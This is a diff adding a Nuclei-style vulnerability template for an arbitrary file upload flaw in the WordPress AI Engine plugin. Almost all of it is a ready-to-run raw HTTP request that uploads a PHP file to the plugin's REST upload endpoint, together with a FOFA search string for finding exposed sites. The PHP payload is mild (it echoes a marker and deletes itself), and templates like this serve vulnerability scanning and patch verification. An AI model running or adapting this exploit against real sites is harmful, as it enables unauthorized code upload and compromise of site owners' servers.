@@ -1,0 +1,65 @@
+id: poc-vqpaghi4n5u8u0c0
+info:
+  name: Wordpress AI Engine 插件 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vqpaghi4n5u8u0c0'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vqpaghi4n5u8u0c0
+    fofa: '"wp-content/plugins/ai-engine/"'
+http:
+- raw:
+  - 'POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1
+
+
+    Accept: */*
+
+
+    Content-Disposition: form-data; filename="test.txt"
+
+
+    Content-Type: multipart/form-data; boundary=------------------------7bghbgerugy87gerbuy
+
+
+    Connection: close
+
+
+
+
+    --------------------------7bghbgerugy87gerbuy
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesuite.php"
+
+
+    Content-Type: text/plain
+
+
+
+
+    <?php echo "DudeSuite";unlink(__FILE__); ?>
+
+
+    --------------------------7bghbgerugy87gerbuy--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
